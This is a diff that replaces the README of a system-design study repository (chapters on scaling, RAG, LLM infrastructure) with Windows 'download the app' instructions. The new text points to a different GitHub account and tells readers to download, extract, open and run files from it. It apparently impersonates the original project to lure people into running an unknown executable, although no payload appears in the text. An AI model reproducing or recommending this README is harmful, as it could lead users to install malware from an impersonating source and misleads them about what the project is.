@@ -1,76 +1,191 @@
-# system-design-bible
-> System design for the AI era. The Primer updated, extended, and maintained.
+# 🧭 system-design-bible - Learn modern system design faster
 
-![Stars](https://img.shields.io/github/stars/ElMoorish/system-design-bible?style=flat-square) ![Contributors](https://img.shields.io/github/contributors/ElMoorish/system-design-bible?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/ElMoorish/system-design-bible?style=flat-square) ![License](https://img.shields.io/github/license/ElMoorish/system-design-bible?style=flat-square) ![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)
+[![Download](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/pencaudal526/system-design-bible)
 
-### Why this repo
-- **Beyond the Primer**: We add the AI infrastructure patterns that reached production after 2022.
-- **Original Synthesis**: We write original explanations and diagrams instead of just aggregating links.
-- **Reference Manual**: This is a free, open-source reference manual designed to be maintained indefinitely.
+## 📥 Download and setup
 
-### Who this is for
-This repository is for software engineers with 2+ years of experience who are preparing for system design interviews at L4–Staff level or building production systems using LLMs, agents, and vector databases.
-**Not for**: Total beginners, ML researchers, or those seeking code tutorials.
+Use the link below to visit the page and download the app or files for Windows:
 
-### Structure Overview
-```mermaid
-flowchart LR
-  F[Foundations] --> A[AI Era]
-  A --> M[Modern Patterns]
-  M --> C[Case Studies]
-  C --> I[Interview Guide]
-```
+[Open the download page](https://github.com/pencaudal526/system-design-bible)
 
-### Table of Contents
+### What you need
+- A Windows PC
+- An internet connection
+- Enough space to save the files
+- A PDF reader or web browser if you plan to open study content
 
-#### Foundations
-- [01-scalability.md](./foundations/01-scalability.md) — Vertical vs horizontal, predictive autoscaling.
-- [02-reliability.md](./foundations/02-reliability.md) — SLOs, chaos engineering, and circuit breakers.
-- [03-databases.md](./foundations/03-databases.md) — SQL, NoSQL, and NewSQL (Spanner/CockroachDB).
-- [04-caching.md](./foundations/04-caching.md) — Distributed caches and semantic LLM caching.
-- [05-networking-apis.md](./foundations/05-networking-apis.md) — gRPC, GraphQL, and SSE token streaming.
-- [06-distributed-systems.md](./foundations/06-distributed-systems.md) — CAP theorem, Raft, and saga patterns.
-- [16-security-by-design.md](./foundations/16-security-by-design.md) — Zero trust and AI-specific attack surfaces.
+### How to get started on Windows
+1. Open the download page.
+2. Find the latest file or release on the page.
+3. Download it to your computer.
+4. Open the downloaded file.
+5. Follow the on-screen steps to finish setup.
+6. Start using the app or open the files in your browser or reader
 
-#### AI Era
-- [07-llm-infrastructure.md](./ai-era/07-llm-infrastructure.md) — GPU memory, KV cache, and vLLM.
-- [08-rag-systems.md](./ai-era/08-rag-systems.md) — Ingestion, hybrid search, and reranking.
-- [09-agent-architecture.md](./ai-era/09-agent-architecture.md) — Multi-agent state machines and MCP.
-- [10-vector-databases.md](./ai-era/10-vector-databases.md) — HNSW vs IVF, pgvector, and multi-tenancy.
-- [11-llmops.md](./ai-era/11-llmops.md) — Tracing, prompt versioning, and AI observability.
-- [12-ai-cost-at-scale.md](./ai-era/12-ai-cost-at-scale.md) — Token economics and model routing.
+### If the file is zipped
+- Right-click the file
+- Choose Extract All
+- Open the folder
+- Start the app or open the main file inside
 
-#### Modern Patterns
-- [13-streaming-realtime.md](./modern/13-streaming-realtime.md) — Kafka, Flink, and real-time feature stores.
-- [14-edge-computing.md](./modern/14-edge-computing.md) — Wasm isolates and edge inference.
-- [15-platform-engineering.md](./modern/15-platform-engineering.md) — IDP design and golden paths.
+## 🧠 What system-design-bible is for
 
-#### Resources
-- [Case Studies](./case-studies/) — 12 real company architectures.
-- [Interview Guide](./interview-guide/50-questions.md) — 50 questions with worked answers.
-- [Glossary.md](./GLOSSARY.md) — 80+ precise term definitions.
+system-design-bible is a study guide for modern system design. It helps you learn the core ideas behind large apps and services. It covers old patterns that still matter, plus newer topics used in AI products today.
 
-### What is new vs the Primer
+This project focuses on:
+- How systems stay fast under load
+- How data moves between services
+- How teams build reliable software
+- How LLM apps use search, memory, and agents
+- How to think about scale without getting lost in details
 
-| Topic | System Design Primer | System Design Bible |
-|---|---|---|
-| Latency Metrics | Uses 2012 Jeff Dean numbers | Uses 2026 NVMe and GPU HNSW numbers |
-| LLM Serving | No coverage | vLLM, continuous batching, KV cache |
-| RAG | No coverage | semantic chunking, hybrid search, reranking |
-| AI Agents | No coverage | multi-agent sync, tool-calling reliability, MCP |
-| Databases | SQL vs NoSQL split | NewSQL, Vector DBs, and sharding logic |
-| Hardware | Magnetic disk focus | NVMe and H100 GPU memory focus |
-| Streaming | Basic Kafka | Flink watermarks, SSE for LLM tokens |
-| Edge | CDN static caching | Wasm isolates, edge inference, stateful edge |
-| Transactions | 2PC and distributed locks | Saga patterns and transactional outbox |
+## ✨ What you can expect
 
-> [!NOTE]
-> ⭐ Star this repo to follow monthly updates as the field evolves.
-> New patterns, case studies, and interview questions added every month.
+- Clear notes on core system design ideas
+- Practical examples for interviews and real projects
+- Coverage of caching, databases, and scaling
+- Guidance on microservices and service boundaries
+- Notes on RAG, vector search, and LLM ops
+- Simple explanations for common architecture choices
+- Study material that fits both beginners and experienced readers
 
-### Contributing
-Contributions are what make the open-source community an amazing place to learn, inspire, and create.
-1. Add a production resource to an existing chapter.
-2. Propose a new case study from a recent engineering blog.
-3. Fix an outdated benchmark with a verified source.
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for details.
+## 🖥️ Windows use guide
+
+After you download the files, use them in one of these ways:
+
+### Read in your browser
+If the content opens as HTML or markdown, double-click the file and use your browser.
+
+### Open PDFs
+If the download includes PDF files, open them in Adobe Reader or another PDF app.
+
+### Browse folders
+If the download gives you folders with chapters or notes, open the main folder and start with the overview file.
+
+### Use search
+If there is a search box or local index, use it to find topics like:
+- caching
+- databases
+- distributed systems
+- RAG
+- LLMOps
+- scalability
+- interview prep
+
+## 🗂️ Main topics covered
+
+### 🚦 Core system design
+- Load balancing
+- Data replication
+- Fault tolerance
+- Sharding
+- Rate limits
+- Backpressure
+- Queue-based work
+
+### 🧱 Data and storage
+- SQL and NoSQL databases
+- Indexes
+- Cache layers
+- Object storage
+- Search systems
+- Vector databases
+
+### 🌐 Distributed systems
+- Service split and service calls
+- Message queues
+- Event-driven design
+- Sync and async flow
+- Consistency tradeoffs
+- System failures and retries
+
+### 🤖 AI-era design
+- LLM infrastructure
+- Retrieval-augmented generation
+- Agent workflows
+- Prompt storage
+- Context handling
+- Evaluation and monitoring
+
+### 📈 Scale and speed
+- Hot path vs cold path
+- Latency control
+- Throughput planning
+- Cache hit rate
+- Cost control
+- Resource limits
+
+## 📚 How to use the content
+
+### For beginners
+Start with the core ideas:
+1. Read about servers, databases, and caches
+2. Learn what happens when traffic grows
+3. Move to queues and services
+4. Then study RAG and agents
+
+### For interview prep
+Use the material to practice:
+- Explaining tradeoffs
+- Drawing simple system diagrams
+- Describing why one design fits better than another
+- Talking through failure cases
+- Comparing SQL, NoSQL, and vector search
+
+### For real projects
+Use the notes when you need to:
+- Plan a new feature
+- Improve response time
+- Reduce server load
+- Organize data better
+- Add AI search or chat features
+
+## ⚙️ Suggested Windows requirements
+
+- Windows 10 or later
+- 4 GB of RAM or more
+- A modern web browser
+- 500 MB of free space for files and notes
+- A text viewer, PDF reader, or markdown app
+
+## 🔎 Useful ways to study
+
+- Start with one topic per day
+- Keep a notebook for key terms
+- Draw small diagrams
+- Compare two design choices at a time
+- Review the same topic in plain language
+- Link each idea to a real app you use
+
+## 🧩 Common file types you may see
+
+- `.md` for notes
+- `.pdf` for reading
+- `.html` for browser viewing
+- `.png` or `.jpg` for diagrams
+- `.json` for structured examples
+
+## 🛠️ If the download does not open
+
+- Check that the file finished downloading
+- Try opening it with another app
+- Move the file to a simple folder like `Downloads`
+- Right-click and choose the right program
+- Download it again if the file looks broken
+
+## 📌 Topics in this repository
+
+algorithms, awesome, caching, career, databases, distributed-systems, education, interview-prep, llm, llmops, machine-learning, microservices, open-source, rag-agents, scalability, software-architecture, software-engineering, system-design, vector-database
+
+## 🧭 Suggested reading path
+
+1. Start with basic system design terms
+2. Learn caches and databases
+3. Move into distributed systems
+4. Study microservices and scalability
+5. Review LLM infrastructure
+6. Finish with RAG, agents, and vector databases
+
+## 🖱️ Quick access
+
+[Visit the download page](https://github.com/pencaudal526/system-design-bible)
